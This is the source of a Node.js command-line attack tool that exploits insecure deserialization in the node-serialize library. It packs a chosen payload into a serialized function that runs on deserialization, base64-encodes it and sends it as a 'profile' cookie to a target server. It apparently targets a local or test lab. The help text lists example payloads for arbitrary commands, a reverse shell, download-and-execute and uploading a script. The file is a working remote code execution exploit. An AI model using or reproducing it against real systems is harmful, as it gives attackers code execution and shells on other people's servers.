var request = require('request');
const fs = require('fs');
const serialize = require('node-serialize');
const commandLineArgs = require('command-line-args');
const commandLineUsage = require('command-line-usage')

class ReplacePair {
    constructor (str) {
      var s = str.split(/=/);
      if (s.length < 2) {
          throw new Error("Invalid replace pair: " + str);
      }
      this.search = s.shift();
      this.replace = s.join('=');

      if (this.search == "_FILE") {
        if (!fs.existsSync(this.replace)) { throw new Error("File '" + this.replace + "' does not exist."); }
        console.log("Reading contents from file: " + this.replace);
        var data = fs.readFileSync(this.replace);
        this.replace = Buffer.from(data).toString('base64');
      }
    }

    apply (str) {

        return str.replace(this.search, this.replace);
    }
  }

const optionDefinitions = [
    { name: 'verbose', alias: 'v', type: Boolean, lazyMultiple: true, description: 'Be more verbose' },
    { name: 'attack', type: String, defaultOption: true, description: 'Attack script file', typeLabel: '{underline file}' },
    { name: 'url', alias: 'u', type: String, description: 'URL of the Node.js server', typeLabel: '{underline url}' },
    { name: 'set', alias: 's', multiple: true, type: str => new ReplacePair(str), description: 'Set placeholder values in attack script', typeLabel: '{underline K1=V1} {underline K2=V2} ...'},
    { name: 'help', alias: 'h', type: Boolean, description: 'Show this help message' }
  ]
const sections = [
    {
        header: 'Node.js Remote Code Execution Attack',
        content: 'Generates RCE attack against vulnerable Node.js server.'
    },
    {
      header: 'Synopsis',
      content: [
        '$ attack.js [{bold --url} {underline url}] {bold --attack} {underline file} [{bold --set} {underline K1=V2} ...]'
      ]
    },
    {
        header: 'Options',
        optionList: optionDefinitions
    },
    {
        header: 'Examples',
        content: [
            '--attack attacks/echo.js',
            '--attack attacks/command.js --set "COMMAND=ls /"',
            '--attack attacks/reverse-shell.js --set HOST=127.0.0.1 PORT=4444',
            '--attack attacks/download-exec.js --set URL=http://example.com/script.py',
            '--attack attacks/upload-exec.js --set _FILE=/path/to/local/script.py'
        ]
    }
]
 
const usage = commandLineUsage(sections)
const options = commandLineArgs(optionDefinitions);
if (!options.verbose) { options.verbose = []; }

if (options.help) {
    console.log(usage)
    process.exit(0);
}

if (options.verbose.length > 1) console.log(options);

if (!options.url) {
    if (options.verbose.length > 1) console.log("# Setting URL to default.");
    options.url = 'http://localhost:3000/';
    // options.url = 'http://csa-test.us-south.containers.appdomain.cloud:30277/';
}
if (options.verbose.length > 0) { console.log("# URL = %s", options.url) }

/* sanity check on attack payload */
if (!options.attack) {
    throw new Error("No attack script provided.");
}

if (!fs.existsSync(options.attack)) {
    throw new Error("No attack script does not exist.");
}

/* load attack */
if (options.verbose.length > 0) console.log("# Loading attack: %s", options.attack)
var payload = fs.readFileSync(options.attack, 'utf8');
if (options.verbose.length > 0) console.log("# Payload: " + payload);


if (options.set) {
    options.set.forEach(function(pair) {
        
        payload = pair.apply(payload);
    })
}

/* create function */
var fn = new Function(payload);

/* compose malicious cookie */
var c = {
    username: 'injected',
    rce: fn
};

/* serialize cookie payload */
var serialized = serialize.serialize(c);
serialized = serialized.replace('}"}', '}()"}');
if (options.verbose.length > 0) console.log("# Serialized attack code: \n" + serialized);

var serialized_b64 = Buffer.from(serialized).toString('base64')
if (options.verbose.length > 0) console.log("# Serialized attack code: \n" + serialized_b64);

/* set cookie */
var j = request.jar()
var request = request.defaults({jar:j})
var cookie = request.cookie('profile=' + serialized_b64);
j.setCookie(cookie, options.url);

/* execute request */
if (options.verbose.length > 0) console.log("# Sending request ...")
request({
    url: options.url, 
    jar: j
  },
  function (error, response, body) {
    console.log('# Request executed:')
    console.log('# - Error:', error); // Print the error if one occurred
    console.log('# - StatusCode:', response && response.statusCode); // Print the response status code if a response was received
    console.log('# - Body:', body); // Print the HTML for the Google homepage.

    var cookie_string = j.getCookieString(options.url); // "key1=value1; key2=value2; ..."
    console.log('# - Cookie: ' + cookie_string);
    var cookies = j.getCookies(options.url);
  }
);

